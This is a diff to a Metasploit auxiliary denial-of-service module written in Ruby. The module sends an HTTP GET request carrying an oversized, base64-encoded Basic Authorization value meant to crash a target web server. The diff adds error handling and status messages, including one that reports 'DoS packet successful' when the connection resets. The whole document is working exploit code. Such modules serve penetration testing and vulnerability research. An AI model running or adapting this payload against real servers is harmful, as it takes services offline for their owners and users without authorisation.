@@ -12,7 +12,6 @@
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
-	Rank = GoodRanking
 
 	include Msf::Exploit::Remote::Tcp
 	include Msf::Auxiliary::Dos
@@ -49,19 +48,29 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
-		connect
-		print_status("Sending packet to #{rhost}:#{rport}")
-		auth = "X" * 127
-		auth << ":"
-		auth << datastore['Password']
+		begin
+			connect
+			print_status("Sending packet to #{rhost}:#{rport}")
+			auth = "X" * 127
+			auth << ":"
+			auth << datastore['Password']
 
-		sploit = "GET "
-		sploit << datastore['URI']
-		sploit << " HTTP/1.1\r\nAuthorization: Basic\r\n"
-		sploit << Base64.encode64(auth)
-		sploit << "\r\n\r\n"
+			sploit = "GET "
+			sploit << datastore['URI']
+			sploit << " HTTP/1.1\r\nAuthorization: Basic\r\n"
+			sploit << Base64.encode64(auth)
+			sploit << "\r\n\r\n"
 
-		sock.put(sploit)
-		disconnect
+			sock.put(sploit)
+			disconnect
+
+			print_status("Server not crashed.  Either the password for 'admin' has been changed or this server is not vulnerable")
+
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+			print_status("Unable to connect to #{rhost}:#{rport}.")
+		rescue ::ERRNO::ECONNRESET
+			print_status("DoS packet successful. #{rhost} not responding.")
+		rescue ::Timeout::Error, ::Errno::EPIPE
+		end
 	end
 end
